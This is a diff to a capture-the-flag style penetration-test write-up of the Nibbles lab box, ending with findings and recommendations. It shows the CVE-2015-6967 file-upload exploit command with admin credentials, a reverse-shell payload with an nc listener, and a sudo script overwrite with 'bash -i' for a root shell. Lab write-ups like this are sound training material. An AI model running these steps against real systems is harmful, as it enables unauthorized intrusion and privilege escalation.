@@ -83,10 +83,6 @@ gobuster dir -u http://10.129.20.119/nibbleblog -w /usr/share/wordlists/dirbuste
 
 - Searchsploit and GitHub PoC confirmed **CVE-2015-6967 Arbitrary File Upload** applicable to Nibbleblog 4.0.3.
 
-Reference PoC Used:
-
-[CVE-2015-6967 Arbitrary File Upload](https://github.com/dix0nym/CVE-2015-6967)
-
 ## 6. Exploitation
 
 ### 6.1 Authentication
@@ -102,7 +98,7 @@ Admin credentials used:
 python3 exploit.py --url http://10.129.20.119/nibbleblog/ --username admin --password nibbles --payload shell.php
 ```
 
-With `exploit.py` as the CVE-2015-6967 Arbitrary File Upload and `shell.php` the default PentestMonkey PHP reverse shell.
+With the CVE-2015-6967 Arbitrary File Upload as `exploit.py` and the default PentestMonkey PHP reverse shell as `shell.php`.
 
 A reverse shell was caught:
 
@@ -113,3 +109,96 @@ nc -lnvp 443
 Result: **Shell as nibbler@Nibbles**
 
 ---
+
+## 7. Privilege Escalation
+
+### 7.1 Sudo Enumeration
+
+```
+sudo -l
+```
+
+#### Finding:
+
+- User *nibbler* can run **monitor.sh** as root with **NOPASSWD**.
+
+### 7.2 Locating the Script
+
+Script was packaged inside `personal.zip`. After extraction:
+
+```
+unzip personal.zip
+```
+
+The script was found at:
+
+```
+/home/nibbler/personal/stuff/monitor.sh
+```
+
+### 7.3 Overwriting the Script
+
+Backup made:
+
+```
+cp monitor.sh monitor.sh.bak
+```
+
+Malicious replacement:
+
+```
+echo "bash -i" > monitor.sh
+```
+
+### 7.4 Executing as Root
+
+```
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+Result: **Root shell obtained**
+
+---
+
+## 8. Post-Exploitation
+
+### 8.1 User Flag - *REDACTED*
+
+```
+cat /home/nibbler/user.txt
+```
+
+### 8.2 Root Flag - *REDACTED*
+
+```
+cat /root/root.txt
+```
+
+---
+
+## 9. Findings Summary
+
+|Finding|Severity|Description|Impact|
+|-------|--------|-----------|------|
+| Nibbleblog 4.0.3 Arbitrary File Upload (CVE-2015-6967) | High | Allows authenticated arbitrary PHP upload | Remote code execution as web user |
+| Weak admin credentials | High | Default/guessable admin credentials | Enabled exploitation path |
+| Misconfigured sudo privilege (monitor.sh) | High | User *nibbler* can execute script as root without password | Full root compromise |
+
+---
+
+## 10. Recommendations
+
+- Update or decommission **Nibbleblog 4.0.3**.
+- Remove or secure arbitrary file upload functionality.
+- Enforce strong admin passwords.
+- Remove insecure sudo NOPASSWD entries.
+- Apply least-privilege principles to user scripts.
+
+---
+
+## 11. Appendix
+
+Reference PoC Used:
+
+[CVE-2015-6967 Arbitrary File Upload](https://github.com/dix0nym/CVE-2015-6967)
+[PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
